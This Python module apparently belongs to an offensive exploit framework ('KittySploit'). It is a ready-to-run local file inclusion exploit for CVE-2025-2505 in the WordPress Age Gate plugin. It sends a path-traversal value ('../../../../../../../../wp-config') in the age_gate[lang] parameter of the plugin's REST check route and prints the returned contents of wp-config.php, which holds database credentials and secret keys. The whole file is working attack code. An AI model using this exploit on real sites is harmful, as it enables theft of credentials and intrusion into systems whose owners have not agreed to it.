#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Age Gate CVE-2025-2505 — REST lang parameter file inclusion."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "Age Gate CVE-2025-2505 LFI",
        "description": "Reads local files via age_gate[lang] on the age-gate REST check route.",
        "author": ["KittySploit Team"],
        "cve": ["CVE-2025-2505"],
        "tags": ["wordpress", "age-gate", "lfi", "auxiliary", "cve-2025-2505"],
    }

    path = OptString("/", "WordPress base path", required=False)
    lang_path = OptString(
        "../../../../../../../../wp-config",
        "PHP file path without .php extension (wp-config loads wp-config.php)",
        required=False,
    )

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        r = self.http_request(
            method="GET",
            path=self._join("/"),
            params={"rest_route": "/age-gate/v3/check", "age_gate[lang]": (self.lang_path or "").strip()},
            allow_redirects=False,
        )
        if not r or r.status_code != 200:
            print_error("LFI request failed")
            return False
        print_status((r.text or "")[:2500])
        return True
